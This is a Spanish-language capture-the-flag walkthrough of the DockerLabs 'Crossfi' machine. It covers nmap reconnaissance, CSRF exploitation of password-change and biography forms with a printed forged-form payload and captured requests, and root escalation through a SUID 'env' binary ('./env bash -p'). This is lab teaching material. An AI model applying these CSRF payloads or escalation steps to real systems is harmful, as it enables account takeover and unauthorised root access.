![Screenshot](/medium/Crossfi/Images/machine.png)

Dificultad: **media**

Creado por: **el pinguino de mario**

---
# Pasos para pwn ü•Ω

* üëÅÔ∏è  [Reconocimiento](#reconocimiento)
* ü™ì [Explotaci√≥n](#explotaci√≥n)
* üö© [Escalada de Privilegios](#escalada-de-privilegios)

---

Primero nos aseguramos de que la m√°quina est√© activa, podemos hacer esto con el comando **ping**.

```java
‚îå‚îÄ‚îÄ(craft„âøkali)-[~/challenges/dockerlabs/medio/crossfi]
‚îî‚îÄ$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.267 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.147 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.094 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2050ms
rtt min/avg/max/mdev = 0.094/0.169/0.267/0.072 ms
```

Despu√©s de ver esto, podemos comenzar ahora nuestra fase de **reconocimiento**.

---
# Reconocimiento

Siempre comenzamos con **nmap** para saber qu√© puertos est√°n abiertos en el objetivo.

```java
‚îå‚îÄ‚îÄ(craft„âøkali)-[~/challenges/dockerlabs/medio/crossfi]
‚îî‚îÄ$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-27 19:34 -05
Initiating ARP Ping Scan at 19:34
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 19:34, 0.18s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:34
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 5000/tcp on 172.17.0.2
Completed SYN Stealth Scan at 19:34, 3.50s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000027s latency).
Scanned at 2025-11-27 19:34:55 -05 for 3s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
5000/tcp open  upnp    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.01 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- Con este argumento le decimos a nmap que escanee todos los puertos, desde el puerto 1 hasta el puerto 65,535.

**-n** <- Con este argumento nmap omitir√° la resoluci√≥n DNS, esto es porque a veces en nuestros escaneos esto puede ser muy lento en algunos casos.

**-sS** <- Con este argumento nmap realizar√° un escaneo sigiloso, esto significa que el 3-way-handshake no se completar√°, y tambi√©n hace el escaneo un poco m√°s r√°pido.

**--min-rate 5000** <- Con este argumento nmap enviar√° al menos 5000 paquetes por segundo, haciendo el escaneo a√∫n m√°s r√°pido.

**-Pn** <- Con este argumento nmap tambi√©n omitir√° la fase de descubrimiento de host, esto significa que nmap tratar√° la m√°quina como activa y realizar√° el escaneo inmediatamente.

**-vv** <- Con este argumento nmap nos mostrar√° los puertos abiertos descubiertos mientras el escaneo contin√∫a, esto significa que si nmap descubre un puerto abierto inmediatamente nos lo reportar√° mientras el escaneo contin√∫a.

**--open** <- Con este argumento le estamos diciendo a nmap que solo filtre los puertos abiertos.

Despu√©s de que el escaneo concluye podemos ver 2 puertos abiertos:

- puerto 22 (ssh / secure shell)
- puerto 5000 ***(upnp?)***

Podemos hacer otro escaneo de **nmap** para saber m√°s sobre estos 2 puertos.

```text
‚îå‚îÄ‚îÄ(craft„âøkali)-[~/challenges/dockerlabs/medio/crossfi]
‚îî‚îÄ$ nmap -p22,5000 -sCV 172.17.0.2 -oX target --stats-every=1m
```

**-p22,5000** <- Con este argumento nmap solo escanear√° estos 2 puertos que descubrimos.

**-sCV** <- Con este argumento nmap escanear√° por cada puerto su versi√≥n para encontrar algunas posibles vulnerabilidades sobre sistemas no actualizados, y tambi√©n har√° un escaneo con algunos scripts que ejecuta nmap, para encontrar m√°s sobre estos puertos.

**-oX target** <- Con este argumento guardamos toda la salida que nmap nos da y la guardamos como un archivo xml.

**--stats-every=1m** <- Con este argumento recibimos estad√≠sticas del escaneo cada 1 minuto, esto puede tener minutos (m) y segundos (s)

Despu√©s de que el escaneo termina obtuvimos la salida en un archivo xml, hacemos esto para crear una p√°gina html y ver la informaci√≥n m√°s f√°cilmente y m√°s agradable a la vista.

```text
‚îå‚îÄ‚îÄ(craft„âøkali)-[~/challenges/dockerlabs/medio/crossfi]
‚îî‚îÄ$ xsltproc target -o target.html
```

Con este comando convertimos el archivo xml a un archivo html, ahora vamos a abrirlo.

```text
‚îå‚îÄ‚îÄ(craft„âøkali)-[~/challenges/dockerlabs/medio/crossfi]
‚îî‚îÄ$ open target.html 
```

Y podemos ver esto en nuestro navegador.

![Screenshot](/medium/Crossfi/Images/image1.png)

Es mucho m√°s limpio y bonito, pero podemos ver que el puerto 5000 es un sitio web, vamos a echar un vistazo con nuestro navegador.

![Screenshot](/medium/Crossfi/Images/image2.png)

Vemos aqu√≠ una p√°gina de inicio de sesi√≥n, vamos a registrar una cuenta.

![Screenshot](/medium/Crossfi/Images/image3.png)

Despu√©s de crear una cuenta podemos ver esto y tambi√©n vemos un panel en el sitio web, vamos a echar un vistazo.

![Screenshot](/medium/Crossfi/Images/image4.png)

Muestra una pista de que este sitio web es vulnerable a CSRF (falsificaci√≥n de solicitud entre sitios) y tambi√©n podemos cambiar nuestra contrase√±a, vamos a interceptar la solicitud con **burpsuite**.

Y recibimos esto:

```python
POST /change-password HTTP/1.1
Host: 172.17.0.2:5000
Content-Length: 20
Cache-Control: max-age=0
Authorization: Basic cGluZ3Vpbml0bzpwaW5ndWluaXRvamVqZQ==
Origin: http://172.17.0.2:5000
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-GB,en;q=0.5
Referer: http://172.17.0.2:5000/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: iconSize=16x16; session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImNyYWZ0In0.aSj-nA.6EOITNgqiuCcMwWmtNQO1GKweTQ
Connection: keep-alive

new_password=test123
```

Podemos ver que esto es vulnerable a CSRF, porque el sitio web no tiene un token CSRF para prevenir este tipo de ataque. Ahora voy a hacer una p√°gina para explotar esta vulnerabilidad y cambiar la contrase√±a que quiero.

![Screenshot](/medium/Crossfi/Images/image5span.png)

**Nota:** cuando el cliente y un servidor establecen una conexi√≥n, cada vez que el usuario hace una solicitud al servidor, el servidor crea otro token aleatorio.

---
# Explotaci√≥n

![Screenshot](/medium/Crossfi/Images/image6.png)

Ahora abrimos nuestro archivo html.

```text
‚îå‚îÄ‚îÄ(craft„âøkali)-[~/challenges/dockerlabs/medio/crossfi]
‚îî‚îÄ$ open exploit.html
```

Podemos ver esto:

![Screenshot](/medium/Crossfi/Images/image7.png)

Obtuvimos estas credenciales de inicio de sesi√≥n para el siguiente nivel.

**Nota**: Este tipo de exploit de CSRF funciona cuando un usuario hace clic en este archivo html o como alg√∫n tipo de sitio web, para explotar esto necesitamos hacer algo de ingenier√≠a social, esto es peligroso si hay un administrador o cuenta privilegiada del sitio web, si la v√≠ctima abre esto podemos hacer mucho da√±o, como cambiar contrase√±as como en este caso, correos electr√≥nicos, apodos, publicar algo como el ataque de twitter o incluso m√°s.

Ahora pasemos a nuestro segundo desaf√≠o.

![Screenshot](/medium/Crossfi/Images/image8.png)

Parece que esta parte tambi√©n es vulnerable a ataques de CSRF, pero existe solo un campo con esta vulnerabilidad, para averiguarlo podemos echar un vistazo al c√≥digo fuente del sitio web.

```html
<!-- Biograf√≠a -->
<div class="col-md-12 mb-3">
<div class="field-card">
<label class="field-label">
üîí Biograf√≠a
<span class="badge bg-success ms-2" style="font-size: 0.7rem;">Protegido</span>
</label>
<form method="POST" action="/update-biografia" class="field-form">
<textarea class="form-control profile-input mb-2" name="biografia" rows="4"
placeholder="H√°blanos un poco sobre ti..."
required></textarea>
<button type="submit" class="btn btn-outline-success w-100">Actualizar
Biograf√≠a</button>
</form>
</div>
</div>
</div>
```

La parte de biograf√≠a es vulnerable a ataques de CSRF, porque no guarda el token csrf aqu√≠. Para ver la diferencia podemos echar un vistazo al campo **nombre** para verlo.

```html
<input type="hidden" name="csrf_token" value="[REDACTED]">
```

Este token previene ataques de CSRF, porque el backend siempre verifica el token de cualquier solicitud.

La t√©cnica es la misma para cambiar la descripci√≥n, hacer un archivo html para explotar esta vulnerabilidad. Pero primero, vamos a interceptar la solicitud para ver c√≥mo se ve.

```python
POST /update-biografia HTTP/1.1
Host: 172.17.0.2:5000
Content-Length: 17
Cache-Control: max-age=0
Authorization: Basic cGluZ3Vpbml0bzpwaW5ndWluaXRvamVqZQ==
Origin: http://172.17.0.2:5000
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-GB,en;q=0.5
Referer: http://172.17.0.2:5000/csrf-level2
Accept-Encoding: gzip, deflate, br
Cookie: iconSize=16x16; session=.eJwlzD0KwzAMBtC7aO7gz7KDyGWCrB8opSk46VR69xayvel9yI6Z2_l6xE4raU33CnerGl1gwl07wsFlLKLcDE2QS5EYzlmycEjTXhMDSLrR-4i53Z1WXN71Gf_ZpuZJ3x-BcyH9.aSkNig.8AbVXDPP1KpM96vmfQlSEUhm-m8
Connection: keep-alive

biografia=test123
```

Podemos ver claramente que no env√≠a el token csrf, esto significa que podemos explotar esto.

```html
<form action="http://172.17.0.2:5000/update-biografia" method="POST" id="hacked">
        <input type="hidden" name="biografia" value="pwned">
</form>
```

Cambiamos la biograf√≠a a **"pwned"** ahora veamos si funciona.

```text
‚îå‚îÄ‚îÄ(craft„âøkali)-[~/challenges/dockerlabs/medio/crossfi]
‚îî‚îÄ$ open exploit.html
```

Y podemos ver esto:

![Screenshot](/medium/Crossfi/Images/image9.png)

Explotamos exitosamente esta vulnerabilidad y obtuvimos las credenciales para iniciar sesi√≥n con **ssh**.

```text
‚îå‚îÄ‚îÄ(craft„âøkali)-[~/challenges/dockerlabs/medio/crossfi]
‚îî‚îÄ$ ssh balulero@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:Y+vEVikvjmIThe5dO9et3Qg4KGerzvldsBAkamu/g6Y
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
balulero@172.17.0.2's password: 
Linux 8d0ccb7863ee 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
```

---
# Escalada de Privilegios

Veamos si existe alg√∫n SUID en el objetivo para escalar nuestros privilegios.

```text
balulero@8d0ccb7863ee:~$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/env
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/sudo
```

Podemos ver que el comando **env** tiene este permiso. Esta es una forma potencial de escalar nuestros privilegios.

Primero, cambiamos al directorio **/usr/bin/**.

```text
balulero@8d0ccb7863ee:~$ cd /usr/bin
```

El comando **env** puede ejecutar otro programa o comando en un entorno modificado sin afectar el entorno actual en el que estamos trabajando.

```text
balulero@8d0ccb7863ee:/usr/bin$ ./env whoami
root
```

Como podemos ver aqu√≠, podemos ejecutar cualquier comando del sistema como el usuario **root**.

Para obtener una shell del usuario **root** podemos ejecutar el siguiente comando:

```text
balulero@8d0ccb7863ee:/usr/bin$ ./env bash -p
```

Este comando hace que lancemos una shell con bash como privilegiado (-p), esto significa que vamos a obtener una shell como el propietario de **bash** (**root**)

```text
balulero@8d0ccb7863ee:/usr/bin$ ./env bash -p
bash-5.2# whoami
root
```

Ahora somos root ***...pwned..!***
